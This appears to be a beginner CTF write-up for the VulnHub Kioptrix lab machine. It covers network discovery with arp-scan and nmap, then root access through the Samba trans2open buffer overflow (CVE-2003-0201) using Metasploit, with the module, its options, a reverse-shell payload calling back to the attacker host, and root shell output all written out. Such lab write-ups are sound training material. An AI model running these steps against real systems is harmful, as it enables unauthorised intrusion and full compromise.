# 🖥️ Kioptrix CTF: Writeup

![Status](https://img.shields.io/badge/Status-Pwned%20✓-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/Platform-VulnHub-orange)

> A classic beginner-friendly CTF machine focused on exploiting 
> an outdated Samba service to gain immediate root access.

---

## 📋 Summary

| Field | Details |
|---|---|
| 🎯 Target IP | 192.168.211.131 |
| 💻 Attacker IP | 192.168.211.129 |
| 🔓 Vulnerability | Samba trans2open Buffer Overflow |
| 📌 CVE | CVE-2003-0201 |
| 🛠️ Tools | nmap, arp-scan, metasploit |
| 🏆 Result | Root access obtained |

---

## 🔭 Methodology
```
Reconnaissance → Enumeration → Exploitation → Root
```

---

## 🔍 Step 1: Discovering Our IP

Before attacking any target, we need to know our own position 
on the network. We run `ip a` and confirm our machine's IP 
address is **192.168.211.129**. This is our attack platform.

---

## 🌐 Step 2: Network Discovery

We run `sudo arp-scan -l` to sweep the entire local network 
and discover active hosts:

| IP Address | Role |
|---|---|
| 192.168.211.1 | Main gateway |
| 192.168.211.2 | VM gateway |
| **192.168.211.131** | **🎯 Target server** |
| 192.168.211.254 | Exit gateway |

---

## 🔎 Step 3: Port Scanning with Nmap

Full aggressive scan across all ports:
```bash
nmap -p- -A 192.168.211.131
```

| Port | State | Service | Version |
|---|---|---|---|
| 22/tcp | open | SSH | OpenSSH 2.9p2 |
| 80/tcp | open | HTTP | Apache 1.3.20 |
| 111/tcp | open | rpcbind | RPC #100000 |
| **139/tcp** | **open** | **Samba** | **smbd (MYGROUP)** |
| 443/tcp | open | HTTPS | Apache 1.3.20 |

> ⚠️ **Key finding:** Apache 1.3.20 and Samba on port 139: > both dangerously outdated versions from 2003.

---

## 🌍 Step 4: Checking HTTP

Navigating to `192.168.211.131` reveals a default **Apache Test 
Page**. No login panels, no useful content. The web surface 
is a dead end, but Samba is still waiting.

---

## ⚔️ Step 5: Launching Metasploit
```bash
msfconsole
```

We're now inside one of the most powerful exploitation frameworks 
in existence. Time to hunt.

---

## 🔍 Step 6: Searching for Samba Exploits
```bash
msf6 > search samba
```

Metasploit returns dozens of modules. We scan through looking 
for something that matches Samba 2.2.x on Linux.

---

## 🎯 Step 7: Selecting the Exploit
```bash
msf6 > use exploit/linux/samba/trans2open
```

> ✅ Rated **"great"**: trans2open Buffer Overflow targeting 
> Linux x86 Samba 2.2.x. A perfect match for our target.

---

## ⚙️ Step 8: Configuring the Module
```bash
msf6 exploit(linux/samba/trans2open) > options
```

| Option | Value | Status |
|---|---|---|
| RHOSTS | 192.168.211.131 | ✅ Set |
| RPORT | 139 | ✅ Default |
| LHOST | 192.168.211.129 | ✅ Set |
| LPORT | 4444 | ✅ Default |

---

## 🐚 Step 9: Setting Up the Reverse Shell

The default `meterpreter/reverse_tcp` payload fails here. 
We switch to a more compatible option:
```bash
set PAYLOAD generic/shell_reverse_tcp
set RHOSTS 192.168.211.131
```

RHOSTS points to the target, LHOST points back to us. 
The trap is set. 🪤

---

## 💥 Step 10: Exploitation & Root
```bash
msf6 exploit(linux/samba/trans2open) > run
```

Metasploit brute-forces memory addresses. Multiple shell 
sessions open simultaneously. We drop in and check our 
privileges:
```bash
id
```
```
uid=0(root) gid=0(root) groups=99(nobody)
```
```bash
whoami
```
```
root
```

> 🏆 **Root obtained immediately.** No privilege escalation 
> required: the Samba vulnerability handed us full system 
> access directly.

---

## 📖 Lessons Learned

- Always keep services **up to date**: outdated Samba versions 
  are trivially exploitable
- **Port 139** running old Samba is a massive red flag in any 
  penetration test
- Metasploit's `trans2open` module is a reliable, well-documented 
  exploit for this vulnerability class

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `ip a` | Identify attacker IP |
| `arp-scan` | Network host discovery |
| `nmap` | Port scanning & service detection |
| `metasploit` | Exploitation framework |

---

*Kioptrix CTF: pwned via Samba trans2open buffer overflow 
(CVE-2003-0201)*
